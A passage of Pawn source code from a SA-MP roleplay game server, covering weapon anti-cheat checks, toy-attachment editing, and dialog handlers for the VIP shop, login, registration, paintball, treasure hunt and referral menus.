            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][11] != 45 && PlayerInfo[playerid][pAGuns][11] != 45 && GetPlayerWeapon(playerid) == 45)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][11] != 46 && GetPlayerWeapon(playerid) == 46)
        {
        	PlayerInfo[playerid][pGuns][11] = 46;
        }
	}
	return 1;
}

public OnPlayerUpdate(playerid)
{
	if(playerTabbed[playerid] == 1)
	{
		playerTabbed[playerid] = 0;
		playerTabbedTime[playerid] = 0;
		if(GetPVarType(playerid, "tabbedVW") != 0) {
		    SetPlayerVirtualWorld(playerid, GetPVarInt(playerid, "tabbedVW"));
		    DeletePVar(playerid, "tabbedVW");
		}
	}
	playerSeconds[playerid] = gettime();

	if(GetPVarInt(playerid, "IsFrozen") == 1) TogglePlayerControllable(playerid, 0);

	new pCurWeap = GetPlayerWeapon(playerid);
    if(pCurWeap != pCurrentWeapon[playerid])
    {
        OnPlayerChangeWeapon(playerid, pCurWeap);
        pCurrentWeapon[playerid] = pCurWeap;
    }
	return 1;
}

public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
    if(response)
    {
		if(fScaleX < 0.1) fScaleX = 0.1;
		if(fScaleX > 1.5) fScaleX = 1.5;
		if(fScaleY < 0.1) fScaleY = 0.1;
		if(fScaleY > 1.5) fScaleY = 1.5;
		if(fScaleZ < 0.1) fScaleZ = 0.1;
		if(fScaleZ > 1.5) fScaleZ = 1.5;
		if(fOffsetX < -100) fOffsetX = 0;
		if(fOffsetX > 100) fOffsetX = 100;
		if(fOffsetY < -100) fOffsetY = 0;
		if(fOffsetY > 100) fOffsetY = 100;
		if(fOffsetZ < -100) fOffsetZ = 0;
		if(fOffsetZ > 100) fOffsetZ = 100;

		SendClientMessage(playerid, COLOR_WHITE, "Toy position saved.");

		PlayerToyInfo[playerid][slotselection[playerid]][ptPosX] = fOffsetX;
		PlayerToyInfo[playerid][slotselection[playerid]][ptPosY] = fOffsetY;
		PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ] = fOffsetZ;
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotX] = fRotX;
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotY] = fRotY;
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ] = fRotZ;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = fScaleX;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = fScaleY;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = fScaleZ;

		RemovePlayerAttachedObject(playerid, slotselection[playerid]);
		SetPlayerAttachedObject(playerid, slotselection[playerid], PlayerToyInfo[playerid][slotselection[playerid]][ptModelID],
		PlayerToyInfo[playerid][slotselection[playerid]][ptBone], PlayerToyInfo[playerid][slotselection[playerid]][ptPosX],
		PlayerToyInfo[playerid][slotselection[playerid]][ptPosY], PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ],
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotX], PlayerToyInfo[playerid][slotselection[playerid]][ptRotY],
		PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX],
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ]);
    }  else  {
        SendClientMessage(playerid, COLOR_GREY, "Toy position not saved.");
		RemovePlayerAttachedObject(playerid, slotselection[playerid]);
    }
    return 1;
}

stock ShowEditMenu(playerid)
{
    if(IsPlayerAttachedObjectSlotUsed(playerid, slotselection[playerid]))
	{
 		RemovePlayerAttachedObject(playerid, slotselection[playerid]);
	}
	if(PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] == 0) {
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX] = 1.0;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY] = 1.0;
		PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ] = 1.0;
	}

	SetPlayerAttachedObject(playerid, slotselection[playerid], PlayerToyInfo[playerid][slotselection[playerid]][ptModelID],
	PlayerToyInfo[playerid][slotselection[playerid]][ptBone], PlayerToyInfo[playerid][slotselection[playerid]][ptPosX],
	PlayerToyInfo[playerid][slotselection[playerid]][ptPosY], PlayerToyInfo[playerid][slotselection[playerid]][ptPosZ],
	PlayerToyInfo[playerid][slotselection[playerid]][ptRotX], PlayerToyInfo[playerid][slotselection[playerid]][ptRotY],
	PlayerToyInfo[playerid][slotselection[playerid]][ptRotZ], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleX],
	PlayerToyInfo[playerid][slotselection[playerid]][ptScaleY], PlayerToyInfo[playerid][slotselection[playerid]][ptScaleZ]);

    new stringg[856];
    format(stringg, sizeof(stringg), "Bone (%s)\nPosition", HoldingBones[PlayerToyInfo[playerid][slotselection[playerid]][ptBone]]);
 	ShowPlayerDialogEx(playerid, EDITTOYS2, DIALOG_STYLE_LIST, "Toy Menu: Edit", stringg, "Select", "Cancel");
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[]) {

	new string[128],
	sendername[MAX_PLAYER_NAME];

/*	if(GetPVarInt(playerid, "dialog") != dialogid) { // Confirm the dialogid matches what we have in the PVar
		format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) is possibly trying to spoof a dialog ID (%d).", GetPlayerNameEx(playerid), playerid, dialogid);
  		ABroadCast(COLOR_YELLOW, string, 2);

		format(string, sizeof(string), "%s has possibly tried to spoof a dialog ID.", GetPlayerNameEx(playerid));
		AddAutomatedFlag(playerid, string);

		format(string, sizeof(string), "%s has possibly tried to spoof a dialog ID (%d, %d).", GetPlayerNameEx(playerid), dialogid, response);
		Log("logs/crash.log", string);

		return 1;
	}

	DeletePVar(playerid, "dialog"); // Delete the PVar now we're done with it

	if(!isnull(inputtext))
	{
	    if(strfind(inputtext, "%s", true) != -1)
	    {
			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s (ID %d) is possibly dialog-exploiting by attempting to send a null string.", GetPlayerNameEx(playerid), playerid);
  			ABroadCast(COLOR_YELLOW, string, 2);

  			format(string, sizeof(string), "%s is possibly dialog-exploiting by attempting to send a null string.", GetPlayerNameEx(playerid));
  			AddAutomatedFlag(playerid, string);

  			format(string, sizeof(string), "%s has attempted to insert a false string placeholder into a dialog.", GetPlayerNameEx(playerid));
  			Log("logs/crash.log", string);
  			Kick(playerid);
	        return 1;
		}
	}
	*/
    if(dialogid == DIALOG_TOKENSHOP)
	{
	    if(response)
	    {
	        if(listitem == 0)
			{
				if(PlayerInfo[playerid][pVIPTokens] >= 2)
				{
				    SetPlayerHealth(playerid, 100);
				    SendClientMessage(playerid, COLOR_WHITE, "You have received a first aid kit and have been fully healed!");
				    PlayerInfo[playerid][pVIPTokens] -= 2;
				}
				else SendClientMessage(playerid, COLOR_WHITE, "You need atleast 2 tokens for this!");
			}
	        if(listitem == 1)
			{
				if(PlayerInfo[playerid][pVIPTokens] >= 3)
				{
				    SetPlayerArmour(playerid, 100);
				    SendClientMessage(playerid, COLOR_WHITE, "You have received a kelvar vest!");
				    PlayerInfo[playerid][pVIPTokens] -= 3;
				}
				else SendClientMessage(playerid, COLOR_WHITE, "You need atleast 3 tokens for this!");
			}
	        if(listitem == 2)
			{
				if(PlayerInfo[playerid][pVIPTokens] >= 30)
				{
				    SetPlayerArmour(playerid, 100);
				    SendClientMessage(playerid, COLOR_WHITE, "You have received weapon set 1!");
				    GivePlayerWeapon(playerid, 24, 99999);
				    GivePlayerWeapon(playerid, 25, 99999);
				    GivePlayerWeapon(playerid, 29, 99999);
				    GivePlayerWeapon(playerid, 33, 99999);
				    PlayerInfo[playerid][pVIPTokens] -= 30;
				}
				else SendClientMessage(playerid, COLOR_WHITE, "You need atleast 30 tokens for this!");
			}
	        if(listitem == 3)
			{
				if(PlayerInfo[playerid][pVIPTokens] >= 40)
				{
				    SetPlayerArmour(playerid, 100);
				    SendClientMessage(playerid, COLOR_WHITE, "You have received weapon set 2!");
				    GivePlayerWeapon(playerid, 24, 99999);
				    GivePlayerWeapon(playerid, 27, 99999);
				    GivePlayerWeapon(playerid, 30, 99999);
				    GivePlayerWeapon(playerid, 34, 99999);
				    PlayerInfo[playerid][pVIPTokens] -= 40;
				}
				else SendClientMessage(playerid, COLOR_WHITE, "You need atleast 40 tokens for this!");
			}
	        if(listitem == 4)
			{
				if(PlayerInfo[playerid][pVIPTokens] >= 30)
				{
				    SetPlayerArmour(playerid, 100);
				    SendClientMessage(playerid, COLOR_WHITE, "You have received weapon set 3!");
				    GivePlayerWeapon(playerid, 24, 99999);
				    GivePlayerWeapon(playerid, 26, 99999);
				    GivePlayerWeapon(playerid, 31, 99999);
				    GivePlayerWeapon(playerid, 34, 99999);
				    PlayerInfo[playerid][pVIPTokens] -= 30;
				}
				else SendClientMessage(playerid, COLOR_WHITE, "You need atleast 30 tokens for this!");
			}
			if(listitem == 5)
			{
			    if(PlayerInfo[playerid][pVIPTokens] >= 75)
			    {
			        SendClientMessage(playerid, COLOR_WHITE, "You are now flagged for a free car, rules apply.");
			        SendClientMessage(playerid, COLOR_YELLOW, "The vehicle cannot be an LEO or some sort, it can be a truck. (military is allowed)");
			        SendClientMessage(playerid, COLOR_YELLOW, "You are not allowed any weaponized vehicles, I.E. Mr. Splashy.");
			        SendClientMessage(playerid, COLOR_WHITE, "Only a level 4+ administrator can issues these, so be patient and wait for one to come online!");
			        format(string, sizeof(string), "FLAG: %s has got a free car from the Token Shop(VIP), they are ready to be issued it.", GetPlayerNameEx(playerid));
			        Log("logs/flags.log", string);
			        PlayerInfo[playerid][pVIPTokens] -= 75;
			    }
			    else SendClientMessage(playerid, COLOR_WHITE, "You need atleast 75 tokens for this!");
			}
		}
	}

	if(dialogid == DIALOG_VWEAPONS)
	{
	    if(PlayerInfo[playerid][pVip] == 4)
	    {
	    	if(response)
	    	{
		        if(listitem == 0)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a 9MM from the VIP lockers.");
					GivePlayerWeapon(playerid, 22, 99999);
		        }
	 	        if(listitem == 1)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a Deagle from the VIP lockers.");
					GivePlayerWeapon(playerid, 24, 99999);
		        }
	 	        if(listitem == 2)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a MP5 from the VIP lockers.");
					GivePlayerWeapon(playerid, 29, 99999);
		        }
	 	        if(listitem == 3)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a AK-47 from the VIP lockers.");
					GivePlayerWeapon(playerid, 30, 99999);
		        }
	 	        if(listitem == 4)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a M4A1 from the VIP lockers.");
					GivePlayerWeapon(playerid, 31, 99999);
		        }
	 	        if(listitem == 5)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a SPAS-12 from the VIP lockers.");
					GivePlayerWeapon(playerid, 27, 99999);
		        }
	 	        if(listitem == 6)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a Shotgun from the VIP lockers.");
					GivePlayerWeapon(playerid, 25, 99999);
		        }
		        if(listitem == 7)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a Sniper from the VIP lockers.");
					GivePlayerWeapon(playerid, 34, 99999);
		        }
	 	        if(listitem == 8)
		        {
		            SendClientMessage(playerid, COLOR_WHITE, "You have taken a Parachute from the VIP lockers.");
					GivePlayerWeapon(playerid, 46, 99999);
				}
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "You must be a platinum VIP to use this feature!");
	}

	if(dialogid == DIALOG_VIPLOCKER)
	{
	    if(response)
		{
			if(listitem == 0)
			{
				SendClientMessage(playerid, COLOR_WHITE, "You have received a first aid kit and have been fully healed.");
				SetPlayerHealth(playerid, 100);
			}
			if(listitem == 1)
			{
			    SendClientMessage(playerid, COLOR_WHITE, "You have received a kelvar vest.");
			    SetPlayerArmour(playerid, 100);
			}
			if(listitem == 2)
			{
				if(PlayerInfo[playerid][pVip] == 4)
				{
				    ShowPlayerDialog(playerid, DIALOG_VWEAPONS, DIALOG_STYLE_LIST, "VIP Weapons", "9MM\nDeagle\nMP5\nAK-47\nM4A1\nSPAS-12\nShotgun\nSniper\nParachute", "Select", "Cancel");
				}
				else SendClientMessage(playerid, COLOR_WHITE, "You must be a platinum VIP to use this feature!");
				return 1;
			}
			if(listitem == 3)
			{
			    if(PlayerInfo[playerid][pVip] >= 3)
			    {
			    	ShowPlayerDialog(playerid, DIALOG_VJOBS, DIALOG_STYLE_LIST, "VIP Auto-Job", "Arms Dealer\nMechanic\nTrucker", "Select", "Cancel");
			    }
			    else SendClientMessage(playerid, COLOR_WHITE, "You must be a Gold VIP to use this feature!");
			}
			if(listitem == 4)
			{
				if(VIPColor[playerid] == 0)
				{
					VIPColor[playerid] = 1;
					SendClientMessage(playerid, COLOR_WHITE, "You have enabled your VIP player color! [press TAB to view it.]");
				    SetPlayerColor(playerid, COLOR_PURPLE);
			    }
			    else
				{
				    SendClientMessage(playerid, COLOR_WHITE, "You have turned off your VIP player color!");
				    SetPlayerColor(playerid, COLOR_WHITE);
				    VIPColor[playerid] = 0;
			    }
			}
		}
	}
	if(dialogid == DIALOG_VJOBS)
	{
	    if(PlayerInfo[playerid][pVip] >= 3)
	    {
		    if(response)
		    {
		        if(listitem == 0)
		        {
					PlayerInfo[playerid][pJob] = 9;
					SendClientMessage(playerid, COLOR_WHITE, "You have taken the Arms Dealer Job.");
		        }
	 	        if(listitem == 1)
		        {
	                PlayerInfo[playerid][pJob] = 7;
	                SendClientMessage(playerid, COLOR_WHITE, "You have taken the Mechanic Job.");
		        }
				if(listitem == 2)
		        {
	                PlayerInfo[playerid][pJob] = 20;
	                SendClientMessage(playerid, COLOR_WHITE, "You have taken the Trucker Job.");
		        }
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "You must be a Gold VIP to use this feature!");
	}

	if(dialogid == MAINMENU || dialogid == MAINMENU2) {
		if(dialogid == MAINMENU) {
			if(response == 0) {
				SendClientMessage(playerid, COLOR_NEWS, "You have been auto-kicked.");
				Kick(playerid);
			}
			else {
				if(strlen(inputtext)) {
					new passbuffer[129], name[MAX_PLAYER_NAME];
					GetPlayerName(playerid, name, sizeof(name));
					WP_Hash(passbuffer, sizeof(passbuffer), inputtext);
					AttemptPlayerLogin(playerid, passbuffer);

					strcpy(AdminRelogPassword[playerid], passbuffer, 129);
    			}
				else
				{
					new titlestring[64], dstring[512];
					format(titlestring, sizeof(titlestring), "{FFA500}Next Generation Roleplay - Login");
					format(dstring, sizeof(dstring), "{FFFFFF}Wrong password.\n\n{FFFFFF}That username is registered, please enter your password below.\n\n{FFA500}Username: {FFFFFF}%s\n\n {FFA500}Password:", GetPlayerNameEx(playerid));
					ShowPlayerDialogEx(playerid,MAINMENU,DIALOG_STYLE_PASSWORD,titlestring,dstring,"Login","Quit");
					if(gPlayerLogTries[playerid] == 2) { SendClientMessage(playerid, COLOR_NEWS, "Wrong password, you have been kicked out automatically."); Kick(playerid); }
				}
			}
		}
		if(dialogid == MAINMENU2)
		{
			if(response == 0)
			{
				SendClientMessage(playerid, COLOR_NEWS, "You have been kicked out automatically.");
                //KillTimer(GetPVarInt(playerid, "MenuTimer"));
				Kick(playerid);
			}
			else if(strlen(inputtext))
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new passbuffer[129];
				WP_Hash(passbuffer, sizeof(passbuffer), inputtext);
				OnPlayerRegister(playerid,passbuffer);
			}
		}
	}
	else if(dialogid == REGISTRATION_MENU_ONE)
	{
	    if(response) {
	        PlayerInfo[playerid][pSex] = 1;
	        PlayerInfo[playerid][pSkin] = 299;
	    } else {
	        PlayerInfo[playerid][pSex] = 2;
	        PlayerInfo[playerid][pSkin] = 55;
	    }

	    ShowPlayerDialogEx(playerid, REGISTRATION_MENU_TWO, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}What do you want your character's age to be?\n\nNote: The age must be no lower than 18 and no higher than 90.", "Done", "");
	}
	else if(dialogid == REGISTRATION_MENU_TWO)
	{
		if(!IsNumeric(inputtext))
		{
			ShowPlayerDialogEx(playerid, REGISTRATION_MENU_TWO, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}ENTRY DECLINED: You must enter a number!\n\nWhat do you want your character's age to be?\n\nNote: The age must be no lower than 18 and no higher than 90.", "Done", "");
			return 1;
		}
		new age = strval(inputtext);
		if(age < 18 || age > 90)
		{
			ShowPlayerDialogEx(playerid, REGISTRATION_MENU_TWO, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}ENTRY DECLINED: The age can only be from 18 to 90!\n\nWhat do you want your character's age to be?\n\nNote: The age must be no lower than 18 and no higher than 90.", "Done", "");
			return 1;
		}

		PlayerInfo[playerid][pAge] = age;
		SetPlayerVirtualWorld(playerid, 0);

		ShowPlayerDialogEx(playerid, REGISTRATION_MENU_THREE, DIALOG_STYLE_MSGBOX, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}Have you been referred here by one of our players?", "Yes", "No");
  	}
	else if(dialogid == 3652) {
		if(!response)
		    return 1;

		switch(listitem) {
			case 0: {
			    // Paintball is static right now; I may change this in the future. Each arena has its own static ID, DM goes from 1-3, TDM goes from 4-6
			    ShowPlayerDialogEx(playerid, 3653, DIALOG_STYLE_LIST, "Paintball - DM", "LV Warehouse\nRandom Warehouse\nRC Battlefield", "Go", "Cancel");
			}
			case 1: {
			    // Paintball is static right now; I may change this in the future. Each arena has its own static ID, DM goes from 1-3, TDM goes from 4-6
			    ShowPlayerDialogEx(playerid, 3654, DIALOG_STYLE_LIST, "Paintball - TDM", "LV Warehouse\nRandom Warehouse\nRC Battlefield", "Go", "Cancel");
			}
			case 2: {
			    new
			        iPlayer = INVALID_PLAYER_ID;

			    foreach(Player, i) {
					if(GetPVarInt(i, "PBM") > 0) {
					    iPlayer = i; // always going to get the highest ID because Y_Less never added a 'break;' for foreach ~_~ ...or didn't document it
					}
			    }

			    if(iPlayer == INVALID_PLAYER_ID)
			        return SendClientMessage(playerid, COLOR_GREY, "Sorry, there's no players in any games right now.");

			    JoinPaintballGame(playerid, GetPVarInt(iPlayer, "PBM"));
			}
		}
	}
	else if(dialogid == DIALOG_SAN_CLOTHES) {
		switch(listitem) {
			case 0: {
				PlayerInfo[playerid][pSkin] = 113;
				SetPlayerSkin(playerid, 113);
			}
			case 1: {
				PlayerInfo[playerid][pSkin] = 148;
				SetPlayerSkin(playerid, 148);
			}
		}

		return 1;
	}
	else if(dialogid == 3653) {
		if(!response)
		    return 1;

		SendClientMessage(playerid, COLOR_WHITE, "You're preparing to play a game of deathmatch paintball.");
		SendClientMessage(playerid, COLOR_GREY, "The objective is to kill as many players as you can.");

	    switch(listitem) {
	    	case 0: JoinPaintballGame(playerid, 1);
	    	case 1: JoinPaintballGame(playerid, 2);
	    	case 2: JoinPaintballGame(playerid, 3);
	    }
	}
	else if(dialogid == 3654) {
		if(!response)
		    return 1;

 		SendClientMessage(playerid, COLOR_WHITE, "You're preparing to play a game of *team* deathmatch paintball.");
		SendClientMessage(playerid, COLOR_GREY, "The objective is to kill as many enemies as you can, as a team.");

	    switch(listitem) {
	    	case 0: JoinPaintballGame(playerid, 4);
	    	case 1: JoinPaintballGame(playerid, 5);
	    	case 2: JoinPaintballGame(playerid, 6);
	    }
	}

	#if defined TREASURE_HUNT_ENABLED
	if(dialogid == DIALOG_HUNT_PRIZE) {
	    if(!response) {
	        SetRandomHuntPos();
	        DeletePVar(playerid, "fT");
	        return 1;
		}

		switch(listitem) {
		    case 0: {
		        PlayerInfo[playerid][pPot] += 20;
  		      	PlayerInfo[playerid][pCrack] += 10;

        		format(string, sizeof(string), "%s has selected 20 pot and 10 crack as their prize.", GetPlayerNameEx(playerid));
				Log("logs/treasurehunt.log", string);
		        SendClientMessage(playerid, COLOR_WHITE, "You have chosen 20 crack, 10 pot. Congratulations, well deserved!");
		    }
		    case 1: {
				PlayerInfo[playerid][pMats] += 2000;

				format(string, sizeof(string), "%s has selected 2,000 materials as their prize.", GetPlayerNameEx(playerid));
				Log("logs/treasurehunt.log", string);
				SendClientMessage(playerid, COLOR_WHITE, "You have chosen 2,000 materials. Congratulations, well deserved!");
			}
		    case 2: {
		        GivePlayerValidWeapon(playerid, 24, 50000);

  				format(string, sizeof(string), "%s has selected a Desert Eagle as their prize.", GetPlayerNameEx(playerid));
				Log("logs/treasurehunt.log", string);
		        SendClientMessage(playerid, COLOR_WHITE, "You have chosen a Desert Eagle. Congratulations, well deserved!");
		    }
		    case 3: {
		        PlayerInfo[playerid][pRespect] += 1;

  				format(string, sizeof(string), "%s has selected 1 respect point as their prize.", GetPlayerNameEx(playerid));
				Log("logs/treasurehunt.log", string);
		        SendClientMessage(playerid, COLOR_WHITE, "You have chosen 1 respect point. Congratulations, well deserved!");
		    }
		}

		SetRandomHuntPos();
		DeletePVar(playerid, "fT");

		return 1;
	}
	else if(dialogid == DIALOG_HUNT_QUESTION) {
	    if(!response) {
	        SetRandomHuntPos();
	        DeletePVar(playerid, "fT");
	        return 1;
		}

	    switch(GetPVarInt(playerid, "HuntQ")) {
	        case 0: {
				if(listitem == 2) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 1: {
				if(listitem == 0) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 2: {
				if(listitem == 2) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 3: {
				if(listitem == 1) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 4: {
				if(listitem == 2) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 5: {
				if(listitem == 1) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 6: { // 0
				if(listitem == 0) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 7: { // 2
				if(listitem == 2) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 8: { // 0
				if(listitem == 0) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
			case 9: { // 1
				if(listitem == 1) {
				    PrizeMenu(playerid);
				} else {
				    SetRandomHuntPos();
					SendClientMessage(playerid, COLOR_GREY, "You provided an incorrect answer. The treasure has been moved! Better luck next time.");
					DeletePVar(playerid, "fT");
				}
			}
	    }
	}
	#endif

  	if(dialogid == REGISTRATION_MENU_THREE)
  	{
   		if(response)
	    {
	        ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}What is the name of the player that referred you?\n\nNote: It must be the full player name with underscore ('_'). For example: John_Smith", "Done", "Cancel");
	    }
  	    else
  	    {
			HideMainMenuGUI(playerid);
			PlayerPlaySound(playerid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //Music Off

			SetPlayerPos(playerid, 1128.90, -1367.02, 51.81);
			SetPlayerCameraPos(playerid, 1128.90, -1367.02, 51.81);
			SetPlayerCameraLookAt(playerid, 1128.90, -1367.02, 51.81);
			TogglePlayerControllable(playerid, false);
			SetPVarInt(playerid, "IsFrozen", 1);

			for(new t = 0; t != 9; t++)
			{
				TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
			}

			TutorialProgress[playerid] = 1;

			SetTimerEx("TutorialProgression", 14500, 0, "d", playerid);
		}
	}
	else if(dialogid == REGISTRATION_MENU_FOUR)
  	{
        if(response) {
            if(IsNumeric(inputtext)) {
                ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}ENTRY DECLINED: The entry can't be a number.\n\nWhat is the name of the player that referred you?\n\nNote: It must be the full player name with underscore ('_'). For example: John_Smith", "Done", "Cancel");
                return 1;
            }
            for(new i = 0; i < strlen(inputtext); i++) {
                if(inputtext[i] == ' ') {
                    ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}ENTRY DECLINED: Please use the '_'(underscore) instead of the ' '(space)\n\nWhat is the name of the player that referred you?\n\nNote: It must be the full player name with underscore ('_'). For example: John_Smith", "Done", "Cancel");
                    return 1;
                }
            }
            if(strfind(inputtext, "_", true) == -1) {
                ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}ENTRY DECLINED: Please choose a name in the correct format: Firstname_Lastname.\n\nWhat is the name of the player that referred you?\n\nNote: It must be the full player name with underscore ('_'). For example: John_Smith", "Done", "Cancel");
                return 1;
            }
            if(strlen(inputtext) > 20) {
                ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}ENTRY DECLINED: You can't select a name that's above 20 characters.\n\nWhat is the name of the player that referred you?\n\nNote: It must be the full player name with underscore ('_'). For example: John_Smith", "Done", "Cancel");
                return 1;
            }

            new
                szPlayerName[MAX_PLAYER_NAME],
                szQuery[128];

			mysql_escape_string(inputtext, szPlayerName,MAX_PLAYER_NAME,sqldb);

			format(PlayerInfo[playerid][pReferredBy], MAX_PLAYER_NAME, "%s", szPlayerName);

			mysql_format(sqldb,szQuery, sizeof(szQuery), "SELECT Username FROM players WHERE Username = '%s'", szPlayerName);
			mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_REFERRAL_MENU,playerid);
        }
        else
        {
            strcpy(PlayerInfo[playerid][pReferredBy], "0", 32);
			HideMainMenuGUI(playerid);
			PlayerPlaySound(playerid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //Music Off

			SetPlayerPos(playerid, 1128.90, -1367.02, 51.81);
			SetPlayerCameraPos(playerid, 1128.90, -1367.02, 51.81);
			SetPlayerCameraLookAt(playerid, 1128.90, -1367.02, 51.81);
			TogglePlayerControllable(playerid,0);

			for(new t = 0; t != 9; t++)
			{
				TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
			}

			TutorialProgress[playerid] = 1;

			SetTimerEx("TutorialProgression", 14500, 0, "d", playerid);
        }
  	}
  	else if(dialogid == REGISTRATION_MENU_FIVE)
  	{
   		if(response)
	    {
  			HideMainMenuGUI(playerid);
			PlayerPlaySound(playerid,SOUND_OFF,2050.1995, 1344.5500, 13.2378); //Music Off

			SetPlayerPos(playerid, 1128.90, -1367.02, 51.81);
			SetPlayerCameraPos(playerid, 1128.90, -1367.02, 51.81);
			SetPlayerCameraLookAt(playerid, 1128.90, -1367.02, 51.81);
			TogglePlayerControllable(playerid,0);

			for(new t = 0; t != 9; t++)
			{
				TextDrawShowForPlayer(playerid, TutTxtDraw[t]);
			}

			TutorialProgress[playerid] = 1;

			SetTimerEx("TutorialProgression", 14500, 0, "d", playerid);

	    }
  	    else
  	    {
  	    	ShowPlayerDialogEx(playerid, REGISTRATION_MENU_FOUR, DIALOG_STYLE_INPUT, "{FFA500}Next Generation Roleplay - Registration", "{FFFFFF}What is the name of the player that referred you?\n\nNote: It must be the full player name with underscore ('_'). For example: John_Smith", "Done", "Cancel");
		}
	}
	else if(dialogid == 12768)
	{
		if(response)
	    {
			ShowPlayerDialogEx(playerid,INFO_DIALOG,DIALOG_STYLE_MSGBOX,"Referral system information", "If you're offline while the new player reaches 8 playing hours, then you will still receive a referral token on your next login.\n\nYou can trade referral tokens for several items in the referral shop by typing /refshop\n\nIf you refer someone then you're advised not to change your name until the person you referred reaches 8 playing hours,\notherwise no referral tokens will be received.","Close","");
		}
	}
	else if(dialogid == DIALOG_REFSHOP)
	{
		if(response)
		{
			if(listitem == 0)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 1)
			    {
       				PlayerInfo[playerid][pRefTokens] -= 1;

			        PlayerInfo[playerid][pPot] += 50;
